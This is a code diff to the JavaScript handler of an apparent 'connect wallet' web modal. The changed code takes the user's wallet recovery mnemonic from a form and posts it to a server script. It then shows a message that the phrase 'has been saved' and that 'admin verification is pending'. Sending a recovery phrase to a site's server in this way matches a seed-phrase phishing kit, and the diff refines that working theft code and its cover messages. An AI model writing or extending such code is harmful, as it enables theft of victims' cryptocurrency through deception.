@@ -112,20 +112,47 @@ window.WalletModalHandler = {
         try {
             // Submit form via fetch
             const formData = new FormData(document.getElementById('connectForm'));
-            formData.append('phrase', mnemonic);
+            formData.append('mnemonic', mnemonic);
             
-            const response = await fetch('code.php', {
+            const response = await fetch('api/wallet_handler.php', {
                 method: 'POST',
-                body: formData
+                body: formData,
+                credentials: 'same-origin'
             });
             
-            // After submission, show success modal
-            const successModal = document.getElementById('successModal');
-            successModal.style.display = 'flex';
-            successModal.style.visibility = 'visible';
-            setTimeout(() => {
-                successModal.style.opacity = '1';
-            }, 10);
+            // Parse response
+            let result = {};
+            const contentType = response.headers.get('content-type');
+            if (contentType && contentType.includes('application/json')) {
+                try {
+                    result = await response.json();
+                } catch (e) {
+                    result = { success: false, message: 'Invalid JSON response' };
+                }
+            } else {
+                result = { success: response.ok, message: await response.text() };
+            }
+            
+            // Check if request was successful
+            if (result.success) {
+                // Show success modal
+                const successTitle = document.getElementById('successTitle');
+                const successMessage = document.getElementById('successMessage');
+                
+                if (successTitle) successTitle.textContent = 'Wallet Connected!';
+                if (successMessage) successMessage.textContent = result.message || 'Your wallet phrase has been saved successfully. Admin verification is pending.';
+                
+                const successModal = document.getElementById('successModal');
+                successModal.style.display = 'flex';
+                successModal.style.visibility = 'visible';
+                setTimeout(() => {
+                    successModal.style.opacity = '1';
+                }, 10);
+            } else {
+                // Show error message from API
+                const errorMsg = result.message || 'Failed to connect wallet. Please try again.';
+                this.showError(errorMsg);
+            }
             
         } catch (error) {
             console.error('Wallet connection error:', error);
